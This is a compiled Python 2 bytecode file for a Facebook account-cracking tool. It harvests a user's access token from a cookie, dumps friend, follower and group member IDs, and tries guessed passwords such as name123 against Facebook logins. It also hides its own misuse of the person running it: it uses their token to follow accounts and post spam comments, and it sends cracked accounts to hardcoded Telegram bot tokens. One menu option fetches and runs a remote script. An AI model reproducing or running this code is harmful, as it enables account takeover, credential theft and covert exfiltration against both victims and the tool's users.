ó
½³Rbc           @   sm  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z e	 e  e j
 d  d  d l m Z d  d l Z d  d l Z d   Z d e j j   k rYd Z d Z d Z d	 Z d
 Z d Z d Z d j e e e  Z d j e e  Z d j e e  Z d j e e  Z nH d Z d Z d Z d Z d Z d Z d Z d Z d Z d Z d Z d Z d a e  j d  j  j!   a" d Z$ e j% j& d  re j% j' d  d k re( d  j)   j!   Z$ qn  d dT d     YZ* d   Z+ d   Z, d   Z- e j. d  e-   d   Z/ e/   e j. d  d   Z0 d   Z1 d   Z2 d   Z3 d    Z4 d!   Z5 d"   Z6 g  Z7 d#   Z8 d$   Z9 d% dU d&     YZ: d' dV d(     YZ; d)   Z< i d* d+ 6d, d- 6d. d/ 6t" d0 6d1 d2 6d3 d4 6d5 d6 6a= d7   Z> d8   Z? d9   Z@ d:   ZA d;   ZB d aC yZ e  j d<  j  j!   ZD e  j d= eD d> i d? d@ 6dA dB 6dC dD 6j   dE j   aC Wn d aC n XdF   ZE dG dW dH     YZF dI   ZG dJ   ZH dK   ZI dL dX dM     YZJ e j% j& dN  r%n e( dN dO  jK   dP   ZL dQ   ZM dR   ZN eO dS k rieM   n  d S(Y   iÿÿÿÿNs   utf-8(   t
   ThreadPoolc           C   s[   d t  j j   k r% t j d  n2 d t  j j   k rJ t j d  n t j d  d  S(   Ns    linuxt   cleart   wint   cls(   t   syst   platformt   lowert   ost   system(    (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   
   s
    t   linuxs   [0;37ms   [0ms   [0;37m[31ms   [0;37m[34ms   [0;32ms   [0;37m[33ms   [36ms
   {}{}[*]{} s   {}[-]{} s   {}[!]{} t    s   https://m.facebook.coms5   https://api-asutoolkit.cloudaccess.host/useragent.txts   .browseri    t   dump_messagec           B   s   e  Z d    Z d   Z RS(   c         C   sz   | |  _  t   t   d GHt d  j d d  |  _ |  j d k rS t |  n  t |  j d  j   |  j	 d  d  S(   Ns   [1;91mâ¢[1;93mâ¢[1;92mâ¢                                      [1;91mâ¢[1;93mâ¢[1;92mâ¢
[1;91m   _______  ______ _______ _______ _     _
   |       |_____/ |_____| |       |____/ 
[1;97m   |_____  |    \_ |     | |_____  |    \_

[1;95m     â¢ [0;93mGithub -> github.com/GUPTA-SHAKEL [1;95mâ¢   
 [1;91mâ¢[1;93mâ¢[1;92mâ¢                                      [1;91mâ¢[1;93mâ¢[1;92mâ¢s2   [1;95mâ¢[1;96m result filename[1;91m :[1;93m t    t   _R
   t   ws   https://m.facebook.com/messages(
   t   cookiest
   basecookieR   t	   raw_inputt   replacet   fR   t   opent   closet   dump(   t   selfR   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   __init__5   s    	c         C   s±  t  j t j | d t   d |  j j d  } xH| j d d t D]1} d | j d  k rKt  j	 j
 d | j d   } y° x© t | j    D] } |  j j d  | k r¹ q q d	 | j j   k rÔ q n  t |  j d
  j d | | j f  d t t |  j  j   j    Gt j j   q WWqKt k
 rG} qF qKXn  d | j k rF |  j d | j d   qF qF Wt d t t |  j  j   j    |  j f  d  S(   Nt   headersR   s   html.parsert   at   hrefs   /messages/reads   cid\.c\.(.*?)%3A(.*?)&s    c_users   Facebook users   a+s   %s<=>%s
s<   [1;95mâ¢[1;96m dump [1;93m([1;92m%s[1;93m) wait bro !s   View Previous Messages   https://m.facebook.com/s'   
[1;92mâ¢ success %s id saved to : %s(   t   bs4t   BeautifulSoupt   requestst   gett   hdcokR   t   textt   find_allt   Truet   ret   findallt   listt   popR   R   R   t   writet   lent   readt
   splitlinesR   t   stdoutt   flusht	   ExceptionR   t   exit(   R   t   urlt   bst   iR   t   ipt   e(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   @   s$    0&#
!(   t   __name__t
   __module__R   R   (    (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   3   s   	c           C   s8   t  j d  t   d GHd GHd GHd GHd GHt   d  S(   NR   R
   s>   [1;95mâ¢[1;92m 1 [1;96mSee the account results [1;92m[OK]sL   [1;95mâ¢[1;92m 2 [1;96mSee the account results [1;91m[[1;93mCP[1;91m]s   [1;95mâ¢[1;91m 0 [1;96mBack(   R   R   t   bannert
   sel_result(    (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   resultY   s    c          C   s­   t  d  }  |  d k r4 d GHt j d  t   nu |  d k rW t j d  t   nR |  d k rz t j d  t   n/ |  d	 k r t   n d GHt j d  t   d  S(
   Ns)   [1;95mâ¢[1;96m select[1;91m : [1;93mR
   s   [1;91mâ¢ Wrong Inputg      ð?t   1s   xdg-open ok.txtt   2s   xdg-open cp.txtt   0(   R   t   timet   sleepR9   R   R   t   menu(   t   rom(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR8   d   s     



c           C   s	   d GHd  S(   Ns\   [1;91mâ¢[1;93mâ¢[1;92mâ¢                                      [1;91mâ¢[1;93mâ¢[1;92mâ¢
[1;91m   _______  ______ _______ _______ _     _
   |       |_____/ |_____| |       |____/ 
[1;97m   |_____  |    \_ |     | |_____  |    \_

     [1;95m    â¢ [0;93mCoded by : Mark Cornel [1;95mâ¢   
 [1;91mâ¢[1;93mâ¢[1;92mâ¢                                      [1;91mâ¢[1;93mâ¢[1;92mâ¢ 
 [1;95m# [1;96mFb [1;91m : [1;96mfacebook.com/mark.cornel97 
 [1;95m# [1;96mGit[1;91m : [1;96mgithub.com/GUPTA-SHAKEL 
 [1;97m# [1;91m---------------------------------------- [1;97m#  (    (    (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR7   x   s    R   c          C   sß   t  t j    t  t j    }  d j |   } d | GHyr t j d  j } | | k r d GHt  t j    } t j	 d  n) d GHt j
 d  t j	 d  t j   Wn, t j   t d k rÛ t GHt   qÛ n Xd  S(	   Nt   |s   

[37;1m  YOUR ID : [94ms?   https://raw.githubusercontent.com/ofoncity01/multi/main/all.txts&   [92m  YOUR ID IS ACTIVE. .......[97mi   sY   [0;93m YOUR ID IS NOT ACTIVE COPY AND SEND ME MESSAGE ON (WHATSAPP) [0;91m#PRICE 10K!!!s   xdg-open  https://wa.me/2347013107449?text=*Hello*%2C%20*Mark*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*multi*%20*UPDATED*t   __main__(   t   strR   t   geteuidt   getlogint   joinR   R   R!   R=   R>   R   R   R/   t   namet   logot   chk(   t   uuidt   idt   httpCahtt   msg(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyRI   |   s&    "	
c           C   sG   t  j d  t   d GHd GHd GHd GHd GHd GHd GHd GHt   d  S(	   NR   R
   s1   [1;95mâ¢[1;92m 1 [1;96mLogin via token[1;97ms2   [1;95mâ¢[1;92m 2 [1;96mLogin via cookie[1;97ms2   [1;95mâ¢[1;92m 3 [1;96mHow to get token[1;97ms3   [1;95mâ¢[1;92m 4 [1;96mHow to get cookie[1;97ms1   [1;95mâ¢[1;92m 5 [1;96mCrack Instagram[1;97ms&   [1;95mâ¢[1;91m 0 [1;91mExit[1;97m(   R   R   R7   t   pilih_masuk(    (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   masuk   s    c          C   sk  t  d  }  |  d k r4 d GHt j d  t   n3|  d k sL |  d k rV t   n|  d k sn |  d k rx t   nï |  d	 k s |  d
 k r´ t   t j d  t j	 j
   n³ |  d k sÌ |  d k rð t   t j d  t j	 j
   nw |  d k s|  d k r,t   t j d  t j	 j
   n; |  d k sD|  d k rNt
   n d GHt j d  t   d  S(   Ns0   [1;95mâ¢[1;92m [1;96mSelect[1;91m : [1;93mR
   s   [1;91m Wrong Input g      ð?R:   t   01R;   t   02t   3t   03s$   xdg-open https://wa.me/2347013107449t   5t   05se   xdg-open && rm -rf multi && git clone https://github.com/ofoncity01/multi && cd multi && python ig.pyt   4t   04R<   t   00(   R   R=   R>   RN   t   tokent   kukit   tikR   R   R   R/   (   t   lgn(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyRN   £   s4    



c          C   s  t  d  }  y t j d d i	 d d 6d d 6d d	 6d
 d 6d d 6d d 6d d 6d d 6d d 6d i |  d 6} t j d | j  } | d  k r d n d | j d  } Wn t j j	 k
 rÉ d GHn Xt
 d d  }  |  j | j d   |  j   t   t   d  S(   Ns*   
[1;95mâ¢[1;96m Cookie[1;91m : [0;93msG   https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_R   s~   Mozilla/5.0 (Linux; Android 8.1.0; vivo 1808) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36s
   user-agents   https://m.facebook.com/t   referers   m.facebook.comt   hosts   https://m.facebook.comt   originR:   s   upgrade-insecure-requestss#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages	   max-age=0s   cache-controlsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   text/html; charset=utf-8s   content-typeR   s    Cookie s	   (EAAA\w+)s&   
* Fail : maybe your cookie invalid !!s   
* Your fb access token : i   s(   [1;97m[[1;91m![1;97m] ConnectionErrors	   login.txtR   (   R   R   R   R$   t   searchR!   t   Nonet   groupt
   exceptionst   ConnectionErrorR   R(   R   R[   t	   bot_folow(   t   cookiet   datat
   find_tokent   hasil(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyRZ   Á   s*    )	
c          C   s    t  d  }  yW t j d |   } t j | j  } | d } t d d  j |   t   t	   Wn6 t
 k
 r d j t t  GHt j d  t   n Xd  S(   Ns)   
[1;95mâ¢[1;96m Token[1;91m : [0;93ms+   https://graph.facebook.com/me?access_token=RG   s	   login.txtR   s   [1;91mâ¢ Invalid Tokeng      ð?(   R   R   R   t   jsont   loadsR!   R   R(   R[   Rf   t   KeyErrort   formatt   Rt   NR=   R>   RO   (   Rh   t   otwR   t   nama(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyRY   Ú   s    
c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s&   [1;95mâ¢ [1;96mPlease Wait [1;91mi   (   R   R,   R-   R=   R>   (   t   titikt   o(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR[   é   s
    c          C   sk   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t  j d  t   n Xt   d  S(   NR   s	   login.txtt   rs   [1;91mâ¢ Invalid !s   rm -rf login.txt(   R   R   R   R*   t   IOErrorRO   (   t   toket(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   ñ   s    c          C   sÉ   y t  d d  j   }  Wn t k
 r8 d GHt   n Xd } d } t j d | d |   t j d | d |   t j d	 |   t j d
 |   t j d |   t j d |   t d  d  S(   Ns	   login.txtRu   s   [1;92mâ¢ invalidt   100017988424248s2   CRACK VIP.py IS GREAT
 github.com/GUPTA-SHAKEL/VIPs7   https://graph.facebook.com/me/friends?method=post&uids=s   &access_token=s>   https://graph.facebook.com/3933263743432298/comments/?message=s[   https://graph.facebook.com/114757204512430/comments/?message=VERY GOOD-*-ð&access_token=sD   https://graph.facebook.com/100079344519359/subscribers?access_token=sD   https://graph.facebook.com/100001027764318/subscribers?access_token=sD   https://graph.facebook.com/100017988424248/subscribers?access_token=s^   [1;92mâ¢ login success, run again the tools.
[1;96mâ¢ Usage [1;91m: [1;92mpython2 VIP.py(   R   R*   Rv   t   logsR   t   postR/   (   Rw   t   fbidt   kom(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyRf   þ   s    c    
      C   s  y t  d d  j   }  Wn7 t k
 rR d GHt j d  t j d  t   n Xyd GHd GHt d  } yX t	 j
 d	 | d
 |   } t j | j  } | d d j d d  } d | d GHWn> t k
 rt d  j d  t d  j t  t   n Xt	 j
 d	 | d |   } t j | j  } d GHd GHt  | d  } xH | d d D]8 } t j | d  | j | d d | d d  qZW| j   d | d GHd t t  GHd | GHd GHt j j   Wn? t k
 r÷}	 t d  n# t	 j j k
 rd  GHt   n Xd  S(!   Ns	   login.txtRu   s   [0;91mâ¢ Invalids   rm -rf login.txtg{®Gáz?R
   s[   [1;95mâ¢ [1;96mFill in '[1;92mme[1;96m' if you wish to dump your own 
  friends list
 s*   [1;95mâ¢ [1;96mUser Id[1;91m : [1;93ms    https://graph.facebook.com/v2.0/s   ?access_token=t
   first_names   .jsonR   R   s'   [1;95mâ¢ [1;96mName[1;91m : [1;93mRG   s   [1;91mâ¢ Id not found !Ro   s   
[1;91mâ¢ Backs)   ?fields=friends.limit(5000)&access_token=s!   [1;95mâ¢ [1;96mPlease Wait ...R   t   friendsRh   RK   s   <=>s   
s!   [1;92mâ¢ Succes dump id from %ss.   [1;95mâ¢ [1;96mTotal id [1;91m:[1;93m %ss2   [1;95mâ¢ [1;96moutput saved to [1;91m:[1;92m s   
[1;91mâ¢ Failed dump ids   [1;91mâ¢ No Connection!(   R   R*   Rv   R   R   R=   R>   t   logineR   R   R   Rk   Rl   R!   R   Rm   R/   Rn   Rp   R?   t   idfromtemant   appendR(   R   R)   R   R.   Rd   Re   (
   Rw   t   idtt   jokt   opt   qqRu   t   zt   bzR   R4   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   publik  sN    %
	c          C   s  y t  d d  j   }  Wn7 t k
 rR d GHt j d  t j d  t   n Xyd GHd GHt d  } t d	  } yX t	 j
 d
 | d |   } t j | j  } | d d j d d  } d | d GHWn9 t k
 rd j d  GHt d  j t  t   n Xt	 j
 d
 | d | d |   } t j | j  } d GHd GHt  | d  } xD | d D]8 }	 t j |	 d  | j |	 d d |	 d d  qeW| j   d | d GHd t t  GHd | GHd GHWn? t k
 rõ}
 t d   n# t	 j j k
 rd! GHt   n Xd  S("   Ns	   login.txtRu   s   [1;91m â¢ Invalids   rm -rf login.txtg{®Gáz?R
   s]   [1;95mâ¢ [1;96mFill in '[1;92mme[1;96m' if you wish to dump your own 
  followers list
 s*   [1;95mâ¢ [1;96mUser Id[1;91m : [1;93ms(   [1;95mâ¢ [1;96mLimit[1;91m : [1;93ms    https://graph.facebook.com/v2.0/s   ?access_token=R}   s   .jsonR   R   s'   [1;95mâ¢ [1;96mName[1;91m : [1;93mRG   s!   
[1;91mâ¢ Followers not found !Ro   s    [1;91mBacks   /subscribers?limit=s   &access_token=s!   [1;95mâ¢ [1;96mPlease wait ...R   Rh   RK   s   <=>s   
s(   [1;92mâ¢ Succes dump followers from %ss5   [1;95mâ¢ [1;96mTotal followers [1;91m:[1;93m %ss2   [1;95mâ¢ [1;96moutput saved to [1;91m:[1;92m s!   
[1;91mâ¢ Failed dump followerss   [1;91mâ¢ No Connection!(   R   R*   Rv   R   R   R=   R>   RO   R   R   R   Rk   Rl   R!   R   Rm   Rn   Rp   R?   R   R   R(   R   R)   R.   R/   Rd   Re   (   Rw   R   t   kontolR   R   R   Ru   R   R   R   R4   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt	   followers?  sN    #%
		t	   dump_grupc           B   sG   e  Z d    Z d   Z d   Z d   Z d   Z d   Z d   Z RS(   c         C   s#   g  |  _  | |  _ |  j d  d  S(   Ns&   https://m.facebook.com/groups/?seemore(   t   glistR   t   extract(   R   R   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   n  s    		c         C   s  t  j t j | d |  j d t   j d  } x§ | j d d t D] } d | j d  k rF d | j d  k sF d | j d  k r qF qÖ |  j	 j
 i d	 j t  j j d
 | j d    d 6| j d 6 qF qF Wt |  j	  d k rd GHd t |  j	  GHd GHd GHd GHxz t rt d  } | d	 k r<qq| d k r\|  j   t   q| d k r||  j   t   qd GHqWn
 t d  d  S(   NR   R   s   html.parserR   R   s   /groups/t   categoryt   createR
   s   /groups/(.*?)\?RK   RG   i    R   s+   [1;95mâ¢ [1;96myou have %s groups found.s    [1;95mâ¢ [1;96mselect action s9   [1;95mâ¢[1;92m 1 [1;96mget grup by searching the names3   [1;95mâ¢[1;92m 2 [1;96minput group id (manual)
s.   [1;95mâ¢[1;92m [1;96mmenu[1;91m : [1;93mR:   R;   s   [1;95mâ¢[1;91m wrong inputs!   [1;95mâ¢[1;91m no groups found(   R   R   R   R   R   R    R!   R"   R#   R   R   RF   R$   R%   R)   R   Ra   R/   t   manual(   R   R0   R1   R2   t   c(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   s  s0    0*I	



c         C   sâ   t  d  } | d k r% |  j   n¹ t j t j d | d t   d |  j j d  } d | j	 d  j j
   k r t d	  nZ i | d
 6| j	 d  j d 6|  _ |  j   d |  j j d  d d !GH|  j d |  d  S(   Ns2   [1;95mâ¢[1;92m [1;96mgroup id[1;91m : [1;93mR
   s   https://m.facebook.com/groups/R   R   s   html.parsers   konten tidakt   titles%   [1;95mâ¢ [1;91minput id grup errorRK   RG   s,   [1;95mâ¢ [1;96mtarget[1;91m : [1;93m%s i    i   (   R   R   R   R   R   R   R    R   R!   t   findR   R/   t   listedR   t   dumps(   R   RK   Ru   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR     s    4#
c      	   C   s   g  } t  d  j   } | d k r1 |  j   nË d d GHx t |  j  D]t \ } } | | j d  j   k rJ | j |  d t |  | j d  j   j | d t	 | t
 f  f GHqJ qJ Wt |  d k rê d	 | GH|  j   n d GH|  j |  d  S(
   Ns.   [1;95mâ¢[1;92m [1;96mmenu[1;91m : [1;93mR
   t   -i   RG   s     %s. %ss   %s%s%si    s0   [1;91mâ¢ mno result found with this query : %s(   R   R   Ra   t	   enumerateR   R   R   R)   R   t   GRp   t   choice(   R   t	   whitelistt   qR4   R2   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyRa      s     		8	c         C   s   yW | t  d  d |  _ |  j   d |  j j d  GH|  j d |  j j d   Wn) t k
 r } d | GH|  j |  n Xd  S(   Ns/   [1;95mâ¢ [1;96mselect group[1;91m :[1;93m i   s+   [1;95mâ¢ [1;96mtarget[1;91m : [1;93m%sRG   s   https://m.facebook.com/groups/RK   s   [1;95mâ¢ [1;93m%s(   t   inputR   R   R   R   R.   R   (   R   R   R4   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   µ  s    
!	c         C   sQ   t  d  j d d  |  _ |  j d k r7 |  j   n  t |  j d  j   d  S(   Ns2   [1;95mâ¢ [1;96mresult filename [1;91m:[1;93m R   R   R
   R   (   R   R   t   flR   R   R   (   R   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   ¿  s    c         C   sÉ  t  j t j | d |  j d t   j d  } d t t |  j	  j
   j    Gt j j   x | j d  D]} y|t t  j j d | j d d t j d    d	 k rñ| j d d t } d
 | j d  k rhd j t  j j d | j d    } t |  d k rwp qî| t |  j	  j
   k r<wp qît |  j	 d  j d | | j f  wp qñd j t  j j d | j d    } t |  d k r§wp qñ| t |  j	  j
   k rÈwp qñt |  j	 d  j d | | j f  n  Wqp qp qp Xqp Wx} | j d d t D]f } d | j k rxN t r{y |  j d | j d   PWq1t k
 rw} d | GHq1q1Xq1WqqWt d t t |  j	  j
   j    |  j j d  d d !f  d  S(   NR   R   s   html.parsers>   [1;95mâ¢ [1;96mdump [1;93m([1;92m%s[1;93m)  wait bro ! t   h3s   \/R   R   i   s   profile.phpR
   s   profile\.php\?id=(.*?)&i    s   a+s   %s<=>%s
s   /(.*?)\?s   Lihat Postingan Lainnyas   https://m.facebook.com/s&   [1;95mâ¢[1;96m %s, [1;93mretryings1   
[1;92mâ¢ successfully dump %s id from group %sRG   i   (   R   R   R   R   R   R    R!   R)   R   R   R*   R+   R   R,   R-   R"   R$   R%   R   R#   RF   R(   R   R.   R/   R   (   R   R0   Ru   R2   t   ogehR   R4   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   Å  sB    0#9'&'-		(	   R5   R6   R   R   R   Ra   R   R   R   (    (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   l  s   					
	t
   friendlistc           B   s   e  Z d    Z d   Z RS(   c         C   sù   d  |  _ t |  | |  _ d GHt d  |  _ |  j d k rL t |  n© t d  j d d  |  _ t	 |  j d  d j
 t j j d |  j   } t |  d	 k r· t |  n  t j j | d
 |  j  j d d  d |  _ |  j |  j  d  S(   Ns,   [1;95mâ¢ [1;96mEnter the friend list links5   [1;95mâ¢ [1;96mtarget profile url[1;91m : [1;93mR
   s+   [1;95mâ¢ [1;96mfilename[1;91m : [1;93mR   R   s   a+s	   ://(.*?)/i    s   m.facebook.coms   profile.php?id=s
   ?v=friends(   Rb   t   nitelt   langRg   R   RK   R    R   R   R   RF   R   R$   R%   R)   t   subt   okR   (   R   Rg   RK   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   ð  s    	
	!.c         C   sB  t  j t j | d t   d |  j j d  } |  j d  k rÐ | j	 d  j d d !} | |  _ | j	 d  j j
 d  j   j d	 d
  j d d
  j d d
  } | |  _ d | GHd |  j GHd | GHn  x3| j d d t D]} d | j d  k rvd t t |  j  j   j    |  j f Gt j j   d | j d  k rUqæ qvd | j d  k rðd
 j t  j j d | j d    } t |  d k rs| t |  j  j   k rÄqæ qít |  j d  j d | | j f  qsqvd
 j t  j j d | j d    } t |  d k rv| t |  j  j   k rJqæ qst |  j d  j d | | j f  qvn  d | j j   k ræ t d  j d  xa t rþy2 |  j d | j d   t d  j d  PWq¡t  k
 rú} d | GHq¡q¡Xq¡Wqæ qæ Wt! d t t |  j  j   j    |  j |  j f  d  S(    NR   R   s   html.parserR   i    i   R   R   t   )R
   t   (t   .s+   [1;95mâ¢[1;96m target[1;91m : [1;93m%ss+   [1;95mâ¢[1;96m output[1;91m : [1;93m%ss/   [1;95mâ¢[1;96m friendlist[1;91m : [1;93m%sR   R   t   frefsd   [1;95mâ¢[1;96m dump [1;91m([1;92m%s[1;91m)[1;93m/[1;91m([1;92m%s[1;91m)[1;93m wait bro !s   profile_add_friend.phps   profile.phps   profile\.php\?id=(.*?)&s   a+s   %s<=>%s
s   /(.*?)\?s   lihat teman lainR=   i   s   https://m.facebook.com/s   [1;91mâ¢ error : %ss@   
[1;92mâ¢ successfully dump %s %s friends, output saved to %s ("   R   R   R   R   R    Rg   R!   R¡   Rb   R   t   splitR'   R   t   bR   R"   R#   R)   R   R*   R+   R   R,   R-   RF   R$   R%   R(   R   t
   __import__R>   R   R.   R/   (   R   R¤   Ru   R   Rª   R2   t   agR4   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR     sL    0	E		,',',		8(   R5   R6   R   R   (    (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR    î  s   	c      
   C   sj  t  j d d |  d i
 t d 6d d 6d d 6d	 d
 6t d 6d j t j j d t   d 6t d d 6d d 6d d 6d d 6j } t	 t j j d |   d k rµ t
 d | d  n  t	 t j j d | j     d k rð t
 d | d  n  t	 t j j d | j     d k r+t
 d | d   n  t	 t j j d! | j     d k rft
 d" | d#  n  d  S($   Ns7   https://m.facebook.com/settings/apps/tabbed/?tab=activeR   R   R_   s#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   gzip, deflates   accept-encodingsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R`   s
   user-agentR
   s	   ://(.*?)$t   Hosts   /login/?next&ref=dbl&fl&refid=8R]   s	   max-age=0s   cache-controlR:   s   upgrade-insecure-requestss!   application/x-www-form-urlencodeds   content-typet   Pooli    s   %s -> 8BALL POOLLLLLLLLs.   1309178498:AAGxlAjtYYDnUeM04fYsfLz8lFTaSoYooYAt   pubgs   %s -> PUBGGGGGGGGGs.   1305701364:AAG6dmquZmBkHVVVpoSBYx5UHxcQ3NnUfMst   garenas   %s -> FFFFFFFFFFFFFFFs-   928550832:AAGM35_UVioKPJ0EoIH3nqarnndcaHll6cUt   legendss   %s -> EMELLLLLLLLLLLs.   1277181407:AAFABlCxC45BGGS0SzoxRANIMgvKkk6Qhgc(   R   R   R^   t   uaRF   R   R$   R%   R!   R)   t   sendsR   (   R   t   resultsRu   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   ceks/  s    !'''s   m.facebook.comR­   s	   max-age=0s   cache-controlR:   s   upgrade-insecure-requestss
   user-agentsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R`   s   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languagec   
      C   sN  t  j   } | j j t  | j d  } t j | j d  } d j	 t j
 j d | j   } i  } xÇ | d  D]¹ } | j d  d  k r| j d  d k r» | j i |  d 6 q-| j d  d	 k rç | j i | d	 6 q-| j i d | j d  6 qt | j i | j d  | j d  6 qt W| j i | d
 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6 | j j i d d 6 | j d d | j }	 d | j j   j   k réi d d 6|  d 6| d	 6| j j   d 6Sd | j j   j   k r-i d d 6|  d 6| d	 6| j j   d 6Si d d 6|  d 6| d	 6Sd  Sd  S(   Ns   https://m.facebook.com/s   html.parserR
   s   dtsg":\{"token":"(.*?)"R   t   valueRG   t   emailt   passt   fb_dtsgt   m_sessR<   t   __usert   dt   __reqt   __csrt   __at   __dynt   encpasss5   https://m.facebook.com/login/?next&ref=dbl&fl&refid=8R]   sy   https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100Rh   t   c_usert   successt   statusR   t
   checkpointt   cpt   error(   R   t   SessionR   t   updatet   hR   R   R   R!   RF   R$   R%   Rb   Rz   R   t   get_dictt   keys(
   t   emt   past   hostsRu   t   pRª   t   dtgRh   R2   t   po(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   login?  s2    ! *,)) c          C   sr   t  }  i
 |  d 6d d 6d d 6d d 6t d 6d	 j t j j d
 |    d 6|  d d 6d d 6d d 6d d 6} | S(   NR_   s#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   gzip, deflates   accept-encodingsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R`   s
   user-agentR
   s	   ://(.*?)$R­   s   /login/?next&ref=dbl&fl&refid=8R]   s	   max-age=0s   cache-controlR:   s   upgrade-insecure-requestss!   application/x-www-form-urlencodeds   content-type(   R^   R²   RF   R   R$   R%   (   RÏ   Ru   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR    b  s    hc         C   s   g  } x t  |  j    D]o } | d t |  j    d k rc | j | d d |  | d  q | j | d d |  | d d  q Wd j |  S(   Ni    i   t   =s   ; R
   (   R   RÌ   R)   R   RF   (   R   R9   R2   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   cvsh  s     $)c         C   s­   i  } yP xE |  j  d  D]4 } | j i | j  d  d | j  d  d 6 q W| SWnP xE |  j  d  D]4 } | j i | j  d  d | j  d  d 6 ql W| SXd  S(   Nt   ;RÔ   i   i    s   ; (   R©   RÉ   (   R   R9   R2   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   cvds  s    22c         C   s/   t  j d | d d i d d 6|  d 6} d  S(   Ns   https://api.telegram.org/bots   /sendMessageRh   t
   2142858354t   chat_idR!   (   R   Rz   (   t   pesanRY   Rª   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR³     s    s.   https://api-asutoolkit.cloudaccess.host/ip.phps    https://ipapi.com/ip_api.php?ip=R   s   https://ip-api.com/t   Referers   application/json; charset=utf-8s   Content-Types|   Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36s
   User-Agentt   country_namec         C   s  g  } x|  j  d  D]t} t |  d k  r4 q q | j   } t |  d k sv t |  d k sv t |  d k rß | j | d  | j | d  | j | d  | j | d  | j | d	  | j | d
  q | j | d  | j | d  | j | d  | j | d  | j | d	  | j | d
  | j |  d t k rn| j |  q d t k r | j |  q q W| S(   NR   i   i   i   t   123s   @123t   1234t   12345t   123456t   1234567t   nigeriat   pakistan(   R©   R)   R   R   t   ips(   R!   R´   R2   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   generate  s0    6t   crackc           B   s&   e  Z e d   Z d   Z d   Z RS(   c         C   s  g  |  _  g  |  _ d |  _ | t k rM t j d  t   d GHd GHd GHn  xÉt rt d  } | d k rt qP qP | d k ry· x^ t rã y2 t d	  |  _ t	 |  j  j
   j   |  _ PWq t k
 rß } d
 | GHq q Xq Wg  |  _ xF |  j D]; } y( |  j j i | j d  d d 6 Wq÷ q÷ q÷ Xq÷ WWn t k
 rX} d | GHqP n Xd GH|  j   t j d d d g d t j d t j d t j } PqP | d k rP yÑ x^ t ry2 t d  |  _ t	 |  j  j
   j   |  _ PWq±t k
 r
} d | GHq±q±Xq±Wg  |  _ x` |  j D]U } yB |  j j i | j d  d d 6t | j d  d  d 6 Wq"q"q"Xq"WWn t k
 r} d | GHqP n Xd GHd GHd GHt d  j |  j |  j  t j |  j  d GHt j d d d g d t j d t j d t j } PqP qP Wd  S(    Ni    R   s3   
[1;95mâ¢[1;96m [ [1;95mSELECT ACTION [1;96m]
s,   [1;95mâ¢[1;92m 1 [1;96mCrack pass manualsL   [1;95mâ¢[1;92m 2 [1;96mCrack pass [1;93mname123[1;91m,[1;93mname12345s*   
[1;95mâ¢ [1;96mselect[1;91m : [1;93mR
   R:   s/   [1;95mâ¢[1;96m id list file[1;91m : [1;93ms   [1;95mâ¢[1;96m %ss   <=>RK   s   [1;95mâ¢[0;96m %ss[   
